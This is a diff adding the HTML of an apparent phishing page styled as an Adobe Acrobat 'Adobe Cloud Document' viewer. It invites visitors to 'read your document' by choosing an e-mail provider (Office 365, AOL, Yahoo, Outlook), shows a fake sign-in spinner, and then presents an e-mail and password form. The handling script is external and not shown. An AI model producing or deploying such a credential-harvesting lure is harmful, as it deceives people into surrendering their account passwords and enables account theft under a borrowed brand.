@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Adobe Cloud Document</title>
+  <link rel="stylesheet" href="/styles.css" />
+<link rel="icon" href="/favicon.ico" />
+<body>
+  <div class="background-overlay"></div>
+
+  <div class="container">
+    <div class="header-flex">
+      <img
+        src="https://upload.wikimedia.org/wikipedia/commons/4/42/Adobe_Acrobat_DC_logo_2020.svg"
+        alt="Adobe Acrobat Logo"
+        class="logo"
+      />
+      <div class="header-content">
+        <h1>Read Your Document</h1>
+        <p>Please select your e-mail provider below:</p>
+      </div>
+    </div>
+
+    <section id="provider-selection" class="page active">
+      <div class="providers">
+        <button class="provider-btn" data-provider="office365"><img src="https://cdn-icons-png.flaticon.com/512/732/732221.png" alt="Office365" /> Office 365</button>
+        <button class="provider-btn" data-provider="aol"><img src="https://cdn-icons-png.flaticon.com/512/732/732222.png" alt="AOL" /> AOL</button>
+        <button class="provider-btn" data-provider="yahoo"><img src="https://cdn-icons-png.flaticon.com/512/732/732200.png" alt="Yahoo" /> Yahoo</button>
+        <button class="provider-btn" data-provider="outlook"><img src="https://cdn-icons-png.flaticon.com/512/732/732223.png" alt="Outlook" /> Outlook</button>
+        <button class="provider-btn" data-provider="others"><img src="https://cdn-icons-png.flaticon.com/512/25/25373.png" alt="Others" /> Others</button>
+      </div>
+    </section>
+
+    <section id="signing-in" class="page">
+      <div class="signing-in-spinner"></div>
+      <h1>Signing in...</h1>
+      <p>Please wait while we prepare your sign-in with <span id="signing-in-provider"></span>.</p>
+    </section>
+
+    <section id="credentials-input" class="page">
+      <h1 id="credentials-title"></h1>
+      <form id="credentials-form">
+        <label for="email">Email:</label>
+        <input type="email" id="email" name="email" required />
+        <label for="password">Password:</label>
+        <input type="password" id="password" name="password" required />
+        <button type="submit">Submit</button>
+      </form>
+      <button id="back-to-providers" class="back-btn">Back</button>
+      <div id="login-error" style="color:red;display:none;margin-top:1em;"></div>
+    </section>
+
+    <footer>
+      <p>© 2025 Adobe Cloud Incorporated System</p>
+    </footer>
+  </div>
+
+  <script type="module" src="/script.js"></script>
+</body>
+</html>
